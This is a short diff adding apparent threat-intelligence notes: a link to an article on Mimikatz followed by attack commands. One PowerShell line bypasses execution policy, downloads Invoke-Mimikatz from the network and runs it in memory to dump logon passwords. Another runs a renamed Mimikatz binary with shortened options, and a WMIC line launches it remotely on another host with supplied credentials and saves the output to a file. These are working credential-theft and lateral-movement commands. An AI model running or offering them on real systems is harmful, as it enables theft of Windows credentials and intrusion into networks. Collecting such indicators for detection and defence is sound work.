@@ -1,0 +1,8 @@
+https://www.cbronline.com/opinion/mimikatz-ak47
+
+# Powershell variant
+powershell -ep Bypass -NoP -NonI -NoLogo -c IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent[.]com/[REDACTED]/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command ‘privilege::debug sekurlsa::logonpasswordsexit’
+
+# Changing options
+mnl.exe pr::dg sl::lp et -p
+Wmic  /NODE:”[REDACTED]” /USER:”[REDACTED]” /password:[REDACTED] process call create “cmd.exe /c (c:\windows\security\mnl.exe pr::dg sl::lp et -p >c:\windows\security\PList.txt) >> c:\windows\temp\temp.txt”
